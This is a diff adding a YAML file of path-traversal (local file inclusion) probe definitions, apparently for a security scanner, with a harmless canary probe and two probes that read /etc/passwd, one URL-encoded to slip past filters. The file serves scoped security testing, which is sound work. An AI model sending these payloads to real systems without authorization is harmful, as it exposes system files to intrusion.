@@ -1,0 +1,32 @@
+- id: lfi-safe-canary
+  category: lfi
+  engine: path_traversal
+  payload: "../../../../dark_canary.txt"
+  expect: "DARK_LFI_CANARY_OK"
+  safe_scope: any
+  risk_level: safe
+  cwe: CWE-22
+  tags: [canary, traversal]
+  description: Safe non-sensitive canary file traversal probe
+
+- id: lfi-dotdot-passwd
+  category: lfi
+  engine: unix
+  payload: "../../../../etc/passwd"
+  expect: "root:.*:0:0:"
+  safe_scope: demo_lab_only
+  risk_level: medium
+  cwe: CWE-22
+  tags: [unix, etc-passwd]
+  description: Unix traversal probe (scoped to demo-lab / explicit authorized targets)
+
+- id: lfi-encoded-passwd
+  category: lfi
+  engine: unix_encoded
+  payload: "..%2f..%2f..%2f..%2fetc%2fpasswd"
+  expect: "root:.*:0:0:"
+  safe_scope: demo_lab_only
+  risk_level: medium
+  cwe: CWE-22
+  tags: [url-encoded, bypass]
+  description: URL-encoded slash path traversal probe
